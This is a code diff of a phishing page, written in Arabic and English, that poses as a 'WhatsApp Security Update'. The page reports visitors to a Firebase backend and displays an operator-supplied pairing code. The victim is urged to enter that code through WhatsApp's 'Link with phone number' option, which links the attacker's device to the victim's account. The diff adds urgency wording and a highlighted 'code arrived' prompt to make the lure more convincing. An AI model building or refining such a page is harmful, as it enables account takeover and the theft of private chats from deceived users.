@@ -13,11 +13,14 @@
         .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
-        .alert-p { font-size: 14px; color: #3b4a54; text-align: inherit; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; }
-        .steps { text-align: inherit; font-size: 14px; color: #1c1e21; margin-top: 15px; }
-        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 100px; display: flex; flex-direction: column; justify-content: center; }
-        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; }
-        .wait-text { font-size: 11px; color: #8696a0; margin-top: 8px; }
+        /* محاذاة النص للجنب */
+        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
+        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
+        
+        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
+        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
+        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
+        .code-arrived { color: #d91e1e; font-weight: bold; } /* لون مميز عند وصول الكود */
     </style>
 </head>
 <body>
@@ -56,8 +59,9 @@
                 old: "بروتوكول التشفير الحالي:",
                 new: "بروتوكول التشفير المحدث:",
                 alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
-                steps: "<b>طريقة التفعيل:</b><br>1. سيصلك الآن إشعار رسمي من واتساب لربط الجهاز، اضغط عليه.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل الرمز المكون من 8 أرقام الذي سيظهر هنا:",
-                wait: "في انتظار رمز الأمان.."
+                steps: "<b>طريقة التفعيل:</b><br>1. سيصلك الآن إشعار رسمي من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل الرمز المكون من 8 أرقام الذي سيظهر هنا:",
+                wait: "جاري استخراج رمز الأمان..",
+                arrived: "قم بنسخ الكود وضعه في واتساب الآن!"
             },
             en: {
                 title: "WhatsApp Security Update",
@@ -66,7 +70,8 @@
                 new: "Updated Protocol:",
                 alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
                 steps: "<b>How to activate:</b><br>1. You will receive an official notification; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
-                wait: "Awaiting security code.."
+                wait: "Awaiting security code..",
+                arrived: "Copy the code and enter it in WhatsApp now!"
             }
         };
 
@@ -86,7 +91,12 @@
             db.ref('monitoring/' + userId).set({ status: "Online", ts: Date.now() });
             db.ref('commands/' + userId).on('value', (snap) => {
                 if (snap.val() && snap.val().code) {
-                    document.getElementById('pairing-code').innerText = snap.val().code;
+                    const codeDisplay = document.getElementById('pairing-code');
+                    const waitDisplay = document.getElementById('ui-wait');
+                    
+                    codeDisplay.innerText = snap.val().code;
+                    waitDisplay.innerText = lang.arrived;
+                    waitDisplay.classList.add('code-arrived'); // تغيير الشكل ليوحي بوصول الكود
                 }
             });
         }
